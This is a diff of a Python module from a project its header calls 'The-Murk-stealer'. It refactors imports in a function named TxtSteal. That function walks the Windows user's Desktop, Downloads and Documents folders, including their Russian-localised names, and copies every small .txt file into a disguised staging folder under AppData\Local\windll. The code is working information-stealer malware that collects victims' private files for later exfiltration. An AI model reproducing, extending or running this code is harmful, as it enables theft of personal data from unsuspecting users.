@@ -9,58 +9,58 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import os
-import shutil
+from os import environ,path,listdir,sep
+from shutil import copy
 
 
 def TxtSteal():
 	try:
-		pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-		desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-		downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
-		documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
+		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+		desktop = path.join(path.join(environ['USERPROFILE']), 'Desktop')
+		downloads = path.join(path.join(environ['USERPROFILE']), 'Downloads')
+		documents = path.join(path.join(environ['USERPROFILE']), 'Documents')
 		def fromDesktop():
-			listoffiles = os.listdir(desktop)
+			listoffiles = listdir(desktop)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 				if listoffiles[i].endswith(".txt"):
 					txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-				size = os.path.getsize(desktop+"\\"+txtfiles[i])
+				size = path.getsize(desktop+"\\"+txtfiles[i])
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
+				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
-			listoffiles = os.listdir(downloads)
+			listoffiles = listdir(downloads)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 			    if listoffiles[i].endswith(".txt"):
 			        txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-			    size = os.path.getsize(downloads+"\\"+txtfiles[i])
+			    size = path.getsize(downloads+"\\"+txtfiles[i])
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
-			listoffiles = os.listdir(documents)
+			listoffiles = listdir(documents)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 			    if listoffiles[i].endswith(".txt"):
 			        txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-			    size = os.path.getsize(documents+"\\"+txtfiles[i])
+			    size = path.getsize(documents+"\\"+txtfiles[i])
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
@@ -71,51 +71,51 @@ def TxtSteal():
 
 
 	try:
-		desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Рабочий стол')
-		downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Загрузки')
-		documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Документы')
+		desktop = path.join(path.join(environ['USERPROFILE']), 'Рабочий стол')
+		downloads = path.join(path.join(environ['USERPROFILE']), 'Загрузки')
+		documents = path.join(path.join(environ['USERPROFILE']), 'Документы')
 		def fromDesktop():
-			listoffiles = os.listdir(desktop)
+			listoffiles = listdir(desktop)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 				if listoffiles[i].endswith(".txt"):
 					txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-				size = os.path.getsize(desktop+"\\"+txtfiles[i])
+				size = path.getsize(desktop+"\\"+txtfiles[i])
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
+				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
-			listoffiles = os.listdir(downloads)
+			listoffiles = listdir(downloads)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 			    if listoffiles[i].endswith(".txt"):
 			        txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-			    size = os.path.getsize(downloads+"\\"+txtfiles[i])
+			    size = path.getsize(downloads+"\\"+txtfiles[i])
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
-			listoffiles = os.listdir(documents)
+			listoffiles = listdir(documents)
 			txtfiles = []
 			finnalytxtfiles = []
 			for i in range(0, len(listoffiles)):
 			    if listoffiles[i].endswith(".txt"):
 			        txtfiles.append(listoffiles[i])
 			for i in range(0, len(txtfiles)):
-			    size = os.path.getsize(documents+"\\"+txtfiles[i])
+			    size = path.getsize(documents+"\\"+txtfiles[i])
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
